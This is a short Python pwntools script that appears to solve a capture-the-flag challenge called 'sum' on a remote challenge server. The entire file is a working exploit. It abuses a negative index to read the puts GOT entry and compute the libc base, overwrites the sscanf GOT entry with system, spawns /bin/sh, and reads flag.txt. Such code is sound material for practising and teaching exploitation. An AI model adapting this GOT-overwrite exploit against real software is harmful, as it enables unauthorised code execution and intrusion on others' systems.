from pwn import *
import time
HOST = 'sum.challs.cyberchallenge.it'
PORT = int(9134)
exe = ELF("./sum")
libc = ELF("./libc-2.27.so")
io = remote(HOST, PORT)
io.sendlineafter("> ","-1")
io.recvuntil("bye\n\n> ")
io.sendline("get "+str(exe.got.puts // 8))
libc.address = int(io.recvline().decode().strip("\n"))-libc.symbols.puts
io.recvuntil("bye\n\n> ")
time.sleep(0.5)
io.sendline("set %s %s" % (exe.got.__isoc99_sscanf // 8,libc.symbols.system))
io.sendline("/bin/sh")
time.sleep(0.5)
io.sendlineafter("\n> ", "cat flag.txt")
print(io.clean().decode())
